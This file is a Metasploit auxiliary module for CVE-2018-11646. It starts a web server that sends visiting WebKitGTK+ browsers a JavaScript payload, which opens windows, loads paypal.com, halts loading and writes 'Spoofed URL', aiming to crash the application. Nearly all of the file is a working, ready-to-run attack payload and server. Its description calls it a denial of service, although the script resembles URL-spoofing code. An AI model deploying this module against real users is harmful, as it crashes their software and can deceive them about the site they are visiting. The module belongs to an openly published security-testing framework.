##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "WebKitGTK+ leading to an application crash [DoS]",
        'Description'    => %q(
          This module exploits a vulnerability in WebKitFaviconDatabase when pageURL is unset.
          If successful,it could leads to application crash, denial of service.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra', # Original discovery, disclosure
          'Hardik Mehta',  # Original discovery, disclosure
          'Zubin Devnani', # Original discovery, disclosure
          'Manuel Caballero' #JS Code
        ],
        'References' => [
          ['EXPLOIT-DB', '44842'],
          ['CVE', '2018-11646'],
          ['URL', 'https://bugs.webkit.org/show_bug.cgi?id=186164'],
          ['URL', 'https://datarift.blogspot.com/2018/06/cve-2018-11646-webkit.html']
        ],
        'DisclosureDate' => 'June 03 2018',
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = <<-JS
<script type="text/javascript">
   win = window.open("sleep_one_second.php", "WIN"); 
   window.open("https://www.paypal.com", "WIN");  
   win.document.execCommand('Stop');              
   win.document.write("Spoofed URL");   
   win.document.close();
</script>
    JS
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
